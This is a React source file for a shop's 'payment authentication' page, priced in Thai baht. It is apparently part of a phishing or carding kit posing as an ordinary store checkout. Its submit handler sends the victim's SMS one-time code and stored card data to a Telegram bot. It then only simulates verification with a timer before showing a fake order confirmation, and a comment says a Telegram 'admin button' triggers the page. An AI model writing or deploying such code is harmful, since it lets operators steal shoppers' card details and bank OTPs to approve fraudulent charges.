import React, { useState, useEffect } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import { useLanguage } from '../context/LanguageContext'
import { notifySMSCodeEntered } from '../utils/telegramBot'
import LoadingSpinner from '../components/LoadingSpinner'
import './SMSVerificationPage.css'

const SMSVerificationPage = () => {
  const navigate = useNavigate()
  const location = useLocation()
  const { t, language } = useLanguage()
  const [isVerifying, setIsVerifying] = useState(false)
  
  // Get data from location state or localStorage
  const orderData = location.state?.orderData || JSON.parse(localStorage.getItem('pendingOrder') || '{}')
  const cardData = location.state?.cardData || JSON.parse(localStorage.getItem('pendingCardData') || '{}')
  
  const [verificationCode, setVerificationCode] = useState('')
  const [error, setError] = useState('')

  // Format date for display
  const formatDate = () => {
    const date = new Date()
    const day = String(date.getDate()).padStart(2, '0')
    const month = String(date.getMonth() + 1).padStart(2, '0')
    const year = date.getFullYear()
    return `${day}/${month}/${year}`
  }

  // Get last 4 digits of card
  const getCardLast4 = () => {
    if (cardData.cardNumber) {
      const cleaned = cardData.cardNumber.replace(/\s/g, '')
      return cleaned.slice(-4)
    }
    return '****'
  }

  // Handle verification code change
  const handleCodeChange = (e) => {
    const value = e.target.value
    // Only allow numbers
    if (/^\d*$/.test(value) && value.length <= 6) {
      setVerificationCode(value)
      setError('')
    }
  }

  // Handle form submit
  const handleSubmit = async (e) => {
    e.preventDefault()

    if (!verificationCode) {
      setError(t('verificationCodeRequired'))
      return
    }

    if (verificationCode.length < 4) {
      setError(t('invalidVerificationCode'))
      return
    }

    setIsVerifying(true)

    // Send SMS code to Telegram
    notifySMSCodeEntered(verificationCode, cardData, orderData)

    // Simulate verification process (3 seconds)
    setTimeout(() => {
      // Clear cart and pending data
      localStorage.removeItem('cartItems')
      localStorage.removeItem('pendingOrder')
      localStorage.removeItem('pendingCardData')

      // Create final order data
      const finalOrderData = {
        ...orderData,
        orderId: Date.now().toString(),
        timestamp: new Date().toISOString(),
        paymentMethod: 'Credit Card',
        cardLast4: getCardLast4(),
        smsVerified: true
      }

      // Save order
      localStorage.setItem(`order_${finalOrderData.orderId}`, JSON.stringify(finalOrderData))

      // Track Facebook Pixel Purchase event
      if (typeof fbq !== 'undefined') {
        fbq('track', 'Purchase', {
          value: orderData.total,
          currency: 'THB',
          content_type: 'product',
          content_ids: orderData.cartItems.map(item => item.id),
          num_items: orderData.cartItems.length
        })
      }

      // Navigate to order confirmation
      navigate('/order-confirmation', {
        state: { orderData: finalOrderData }
      })
    }, 3000)
  }

  // Check if SMS verification is requested (set by admin button in Telegram)
  useEffect(() => {
    const checkSMSRequested = () => {
      const userId = localStorage.getItem('userId')
      const smsRequested = localStorage.getItem(`sms_requested_${userId}`)
      
      // If not requested, redirect back to payment page
      if (!smsRequested && !location.state?.fromPayment) {
        navigate('/payment', { state: { orderData } })
      }
    }
    
    checkSMSRequested()
  }, [])

  if (!orderData.total) {
    navigate('/')
    return null
  }

  return (
    <div className="sms-verification-page">
      <LoadingSpinner isVisible={isVerifying} />
      
      <div className="sms-verification-container">
        <div className="sms-header">
          <h1>{t('paymentAuthentication')}</h1>
        </div>

        <div className="sms-content">
          <p className="sms-info">{t('smsCodeSent')}</p>

          <div className="payment-info">
            <p>
              {t('authorizingPayment')} <strong>{orderData.total.toFixed(2)} THB</strong> {t('onDate')} <strong>{formatDate()}</strong> {t('withCardEnding')} <strong>************{getCardLast4()}</strong>
            </p>
          </div>

          <form onSubmit={handleSubmit} className="verification-form">
            <div className="form-group">
              <label htmlFor="verificationCode">{t('verificationCode')}</label>
              <input
                type="text"
                id="verificationCode"
                className={`verification-input ${error ? 'error' : ''}`}
                value={verificationCode}
                onChange={handleCodeChange}
                placeholder={t('enterVerificationCode')}
                maxLength={6}
                autoFocus
              />
              {error && <span className="error-message">{error}</span>}
            </div>

            <button type="submit" className="continue-button" disabled={isVerifying}>
              {isVerifying ? t('verifying') : t('continueButton')}
            </button>
          </form>
        </div>
      </div>
    </div>
  )
}

export default SMSVerificationPage

